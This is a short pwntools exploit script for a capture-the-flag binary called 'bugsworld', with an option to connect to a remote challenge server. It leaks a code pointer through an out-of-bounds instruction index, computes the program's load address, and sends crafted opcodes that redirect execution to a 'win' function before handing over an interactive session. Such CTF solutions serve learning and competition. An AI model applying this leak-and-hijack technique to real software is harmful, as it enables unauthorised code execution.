from pwn import *
from pprint import pprint

file = ELF("./bugsworld")
libc = ELF("./libc.so.6")

def prog(opcodes):
    instrs = len(opcodes)
    p.sendlineafter(b"> ", str(instrs).encode())
    p.sendlineafter(b"> ", "\n".join(map(str, opcodes)).encode())

if args.DUMP:
    for key, val in file.got.items():
        if (val - file.sym.instruction_names) % 0x20 == 0:
            log.info(f"{key}: 0x{val:x} {val - file.sym.instruction_names >> 5}")

context.terminal = ["kitty"]

if args.REMOTE:
    p = remote("chall.pwnoh.io", 13382)
elif args.GDB:
    p = gdb.debug("./bugsworld")
else:
    p = process("./bugsworld")

prog([file.sym.instruction_table - file.sym.instruction_names >> 5])
leak = u64(p.recv(6) + b"\x00\x00")
filebase = leak - file.sym.do_move

log.info(f"leak: 0x{leak:x}")
log.info(f"filebase: 0x{filebase:x}")

prog([0, 0, 0, 0, 15, 8, 15, 8] + [0x21, filebase + file.sym.win])
prog([8, 4, 0])

p.interactive()